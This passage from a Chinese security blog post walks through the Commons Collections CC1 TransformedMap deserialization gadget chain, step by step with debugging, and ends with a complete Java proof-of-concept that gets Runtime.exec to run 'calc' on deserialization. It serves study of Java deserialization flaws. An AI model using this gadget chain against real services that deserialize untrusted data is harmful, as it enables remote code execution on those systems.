+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class annotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor annotationInvocationHandlerConstructor =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(true);</span><br><span class="line">Object annotationInvocationHandlerObject =  annotationInvocationHandlerConstructor.newInstance(Override.class,decorateMap);</span><br></pre></td></tr></table></figure>
+
+<p>此时，大致的链子已经构成；但是想要正确序列化还需要满足三个问题：</p>
+<ul>
+<li><strong>Runtime类没有实现Serializable接口，不能对其进行序列化</strong></li>
+</ul>
+<p><img src="/../images/image-20240423233913063.png" alt="image-20240423233913063"></p>
+<p>解决办法:</p>
+<p>可以通过反射的方法来实例化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c = Runtime.class;</span><br></pre></td></tr></table></figure>
+
+<p>返回类型是Class，Class类实现了Serializeable接口</p>
+<p><img src="/../images/image-20240423233951193.png" alt="image-20240423233951193"></p>
+<p>通过反射调用来RCE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class c = Runtime.class;</span><br><span class="line">Method getRuntimeMethod =  c.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Runtime getRuntimeInovke = (Runtime) getRuntimeMethod.invoke(null);  // 静态方法调用无需传入对象</span><br><span class="line">Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">execMethod.invoke(getRuntimeInovke,&quot;calc&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240423234014063.png" alt="image-20240423234014063"></p>
+<p>​		上述的Runtime通过反射，虽然可以进行序列化；但是可以直接利用之前的利用点InvokerTransformer类中的transform方法来实现对Runtime的RCE调用，InvokerTransformer类本身就实现了Serializable接口，可以进行序列化。</p>
+<p>修改代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 结构：new InvokerTransformer(&quot;方法名&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;).transform();</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获得getMethod方法</li>
+</ul>
+<p><img src="/../images/image-20240423234047552.png" alt="image-20240423234047552"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method getMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="line">等价于</span><br><span class="line">Method getRuntimeMethod =  c.getMethod(&quot;getRuntime&quot;);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获得inovke方法</li>
+</ul>
+<p><img src="/../images/image-20240423234109771.png" alt="image-20240423234109771"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime getInvoke =  (Runtime)  new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getMethod);</span><br><span class="line">等价于</span><br><span class="line">Runtime getRuntimeInovke = (Runtime) getRuntimeMethod.invoke(null);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获得exec方法</li>
+</ul>
+<p><img src="/../images/image-20240423234129390.png" alt="image-20240423234129390"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(getInvoke);</span><br><span class="line">等价于</span><br><span class="line">Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</span><br></pre></td></tr></table></figure>
+
+<p>执行结果，弹出计算器</p>
+<p><img src="/../images/image-20240423234149335.png" alt="image-20240423234149335"></p>
+<p>上述通过InvokerTransformer类的transform方法实现的RCE还是有个缺点，就是每个的返回值都得手动传给下一个，比较麻烦。这里有个ChainedTransformer类的transform方法可以遍历实现自动把每个返回值传给下一个的功能。</p>
+<p>修改代码：需要先创建一个Transform数组</p>
+<p><img src="/../images/image-20240423234204471.png" alt="image-20240423234204471"></p>
+<p>分析ChainedTransformer类的transform方法：遍历Transformer数组，并把每次的执行结构返回给下一次使用</p>
+<p><img src="/../images/image-20240423234216863.png" alt="image-20240423234216863"></p>
+<p>因为InvokerTransformer类和ChainedTransformer类本身都实现Transformer接口，所以创建InvokerTransformer对象的返回类型就是Transformer类型的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transforms = new Transformer[]&#123;</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class="line">chainedTransformer.transform(Runtime.class);    // 编写此处代码时，其它代码注释掉了，暂时通过这个调用（后续需要找方法去代替）</span><br><span class="line">// 实际上面一行代码不需要，是通过AnnotationInvocationHandler类的setValue方法传入Runtime对象执行，通过链子调用到transform方法</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240423234236442.png" alt="image-20240423234236442"></p>
+<ul>
+<li><strong>AnnotationInvocationHandler类的readObject方法中需要满足两个IF条件才能调用setValue方法</strong></li>
+</ul>
+<p><img src="/../images/image-20240423234251043.png" alt="image-20240423234251043"></p>
+<p>在IF语句处下个断点，在poc.java文件中进行debug，成功断在IF语句处；可以看到memberType参数为null，所以进入不了IF判断</p>
+<p><img src="/../images/image-20240423234309828.png" alt="image-20240423234309828"></p>
+<p>根据下图中的分析：</p>
+<p>​		如果传入Override.class的话，是没有成员方法的。也就无法进入下面的IF判断。所以需要传入一个有成员方法的注解。memberTpye参数是通过memberTypes.get(name)获得的；而name是通过POC中Map集合传入获得的参数，即name的值为Map集合传入的键值</p>
+<p><img src="/../images/image-20240423234329240.png" alt="image-20240423234329240"></p>
+<p><img src="/../images/image-20240423234337820.png" alt="image-20240423234337820"></p>
+<p><img src="/../images/image-20240423234345961.png" alt="image-20240423234345961"></p>
+<p>修改POC传入的参数为Target.class</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object annotationInvocationHandlerObject =  annotationInvocationHandlerConstructor.newInstance(Target.class,decorateMap);</span><br></pre></td></tr></table></figure>
+
+<p>分析：可以看到memberTypes中已经有内容了，但是到446行代码处，返回的值仍然是null；该函数的意思是获取变量name的值。因为POC传入的键值是key_test，get函数匹配不到所以返回为null</p>
+<p><img src="/../images/image-20240423234417296.png" alt="image-20240423234417296"></p>
+<p>修改POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.put(&quot;value&quot;,&quot;value_test&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>分析：Map集合传入键值为value字符串后，满足get函数的条件，获得内容，进入IF判断</p>
+<p><img src="/../images/image-20240423234448329.png" alt="image-20240423234448329"></p>
+<p>​		继续debug，步进；内层IF判断：判断变量value的是否是memberType类的实例，这里明显不是。value的内容为value_test字符串，两者没有任何关系，直接进入内层IF判断。</p>
+<p><img src="/../images/image-20240423234507487.png" alt="image-20240423234507487"></p>
+<ul>
+<li><strong>AnnotationInvocationHandler类中的setValue无法直接传入Runtime对象</strong></li>
+</ul>
+<p>分析：</p>
+<p>​		setValue() 处中的参数并不可控，而是指定了 AnnotationTypeMismatchExceptionProxy 类，是无法进行命令执行的。需要换一个思路，不能从此处入手；如果能找到一个类有transform方法并且还能够控制transform方法的传参的话，就可以在链子调用到transform方法前通过这个类修改传参内容。</p>
+<p><img src="/../images/image-20240423234529514.png" alt="image-20240423234529514"></p>
+<p>ConstantTransformer类可以实现上述的功能：根据构造方法的分析，只要传入什么对象就返回什么对象，而transform方法不管传入什么都返回构造方法传入的对象参数</p>
+<p><img src="/../images/image-20240423234542793.png" alt="image-20240423234542793"></p>
+<p>构造最终POC</p>
+<p><img src="/../images/image-20240423234555171.png" alt="image-20240423234555171"></p>
+<h3 id="3-POC"><a href="#3-POC" class="headerlink" title="3. POC"></a>3. POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.crypto.dsig.Transform;</span><br><span class="line">import java.awt.image.renderable.RenderableImage;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author shiyingai</span><br><span class="line"> * @create 2023-03-02 23:12</span><br><span class="line"> */</span><br><span class="line">public class poc &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transforms = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class), // 必须写在第一行，先获得Runtime类</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class="line">        // 以上代码是为了实现Runtime参与序列化，反射调用RCE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;,&quot;value_test&quot;);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null,chainedTransformer);     // TransformedMap类间接实现于Map接口</span><br><span class="line"></span><br><span class="line">        Class annotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationHandlerConstructor =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(true);</span><br><span class="line">        Object annotationInvocationHandlerObject =  annotationInvocationHandlerConstructor.newInstance(Target.class,decorateMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 对AnnotationInvocationHandler类进行序列化</span><br><span class="line">        serialize(annotationInvocationHandlerObject);</span><br><span class="line"></span><br><span class="line">        // 对AnnotationInvocationHandler类进行反序列化</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行POC，弹出计算器</p>
+<p><img src="/../images/image-20240423234630906.png" alt="image-20240423234630906"></p>
+<h3 id="4-调用链"><a href="#4-调用链" class="headerlink" title="4. 调用链"></a>4. 调用链</h3><p><img src="/../images/image-20240423234659535.png" alt="image-20240423234659535"></p>
+<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><ol>
+<li><strong>有无readObject方法的情况</strong></li>
+</ol>
+<p>​		当一个类实现了Serializable接口并且在类中定义了readObject方法时，在反序列化该类的过程中，readObject方法会被执行。readObject方法是在反序列化期间由Java的序列化机制自动调用的特殊方法。它的作用是在对象被反序列化后控制其<strong>自定义的处理逻辑</strong>。</p>
+<p>​		当一个类实现了Serializable接口，它的对象可以被序列化和反序列化。如果在反序列化时，被反序列化的类没有定义readObject方法，Java的序列化机制会使用默认的反序列化行为。默认情况下，它会按照类的成员变量的顺序和类型来进行反序列化，然后为对象的字段赋予相应的值。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">0. 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">1. 前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%9E%E6%88%98"><span class="toc-number">3.</span> <span class="toc-text">2. 实战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-POC"><span class="toc-number">4.</span> <span class="toc-text">3. POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">5.</span> <span class="toc-text">4. 调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">6.</span> <span class="toc-text">拓展</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&text=CC1-TransformdMap链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&title=CC1-TransformdMap链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&is_video=false&description=CC1-TransformdMap链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CC1-TransformdMap链&body=Check out this article: https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&title=CC1-TransformdMap链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&title=CC1-TransformdMap链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&title=CC1-TransformdMap链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&title=CC1-TransformdMap链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&name=CC1-TransformdMap链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&t=CC1-TransformdMap链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2024
+    sh1y1n9aI
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--  
+        <li><a href="/">首页</a></li>
+        
+        <li><a href="/archives/">归档</a></li>
+        
+        <li><a href="/categories/">分类</a></li>
+        
+        <li><a href="/tags/">标签</a></li>
+        
+        <li><a href="/search/">搜索</a></li>
+        
+        <li><a href="/about/">关于</a></li>
+          -->
+
+        
+              <!-- 不蒜子统计 -->
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <!--  <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>  -->
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?09589470e358e72a59d6b6a6a3fb6afc";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
